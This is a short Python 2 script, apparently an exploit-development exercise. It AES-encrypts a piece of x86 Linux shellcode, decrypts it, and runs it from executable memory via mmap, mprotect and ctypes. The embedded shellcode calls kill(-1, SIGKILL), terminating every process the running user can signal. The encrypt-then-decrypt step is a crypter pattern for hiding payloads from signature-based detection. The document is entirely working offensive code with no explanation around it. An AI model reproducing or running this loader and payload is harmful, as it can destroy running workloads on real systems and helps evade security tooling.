
# kill all shellcode, decrypt and run 
# adp, 2018

import argparse
import ctypes
import ctypes.util
import platform
import re
import sys
import binascii

from Crypto.Cipher import AES

# Function taken from https://github.com/fishilico/shared/tree/master/#shellcode

def run_code_linux(shellcode):
    """Run the specified shellcode on Linux"""
    # Find functions in libc
    libc = ctypes.CDLL(ctypes.util.find_library('c'))
    libc.mmap.restype = ctypes.c_void_p
    libc.mprotect.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_int]

    # Allocate memory with a RW private anonymous mmap
    # PROT_READ=1, PROT_WRITE=2, PROT_EXEC=4
    mem = libc.mmap(0, len(shellcode), 3, 0x22, -1, 0)
    if int(mem) & 0xffffffff == 0xffffffff:
        libc.perror(b"mmap")
        return 1

    # Copy the shellcode
    ctypes.memmove(mem, shellcode, len(shellcode))

    # Change protection to RX
    if libc.mprotect(mem, len(shellcode), 5) == -1:
        libc.perror(b"mprotect")
        return 1

    # Run!
    return ctypes.CFUNCTYPE(ctypes.c_int)(mem)()

# padded with NOPs to a multiple of 16
shellcode = "\xb8\x25\x00\x00\x00\xbb\xff\xff\xff\xff\xb9\x09\x00\x00\x00\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

# Encryption
cipher = AES.new('kkkkkkkkkkkkkkkk', AES.MODE_CBC, 'vvvvvvvvvvvvvvvv')
cipher_text = cipher.encrypt(shellcode)

print repr(binascii.unhexlify(cipher_text.encode('hex')))

# Decryption
decipher = AES.new('kkkkkkkkkkkkkkkk', AES.MODE_CBC, 'vvvvvvvvvvvvvvvv')
plain_text = decipher.decrypt(cipher_text)

run_code_linux(plain_text)

